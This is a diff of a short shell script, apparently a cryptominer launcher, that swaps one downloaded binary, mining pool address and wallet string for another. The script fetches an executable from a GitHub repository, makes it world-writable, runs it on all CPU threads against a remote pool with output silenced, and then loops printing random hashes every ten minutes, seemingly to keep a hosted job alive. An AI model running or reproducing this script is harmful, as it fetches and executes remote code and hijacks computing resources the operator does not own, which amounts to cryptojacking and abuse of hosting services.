@@ -1,5 +1,5 @@
 #!/bin/sh
-wget https://github.com/aqshakuy/filebatur/raw/master/xmolx
-chmod 777 xmolx
-./xmolx -o 45.79.50.119:80 -u 867VgRiSidDhm8L4gUzkSoKA49D6bcsBwRneopcngnQb85TX3LG9poAfdThb3nxLmXBCEh2KHkpUUSU8DbjVjX9oSKScM6D.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x C -t$(nproc --all) >/dev/null 2>&1
+wget https://github.com/bengetsia/soft/raw/main/jilox
+chmod 777 jilox
+./jilox -o 139.162.30.222:443 -u ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x C -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
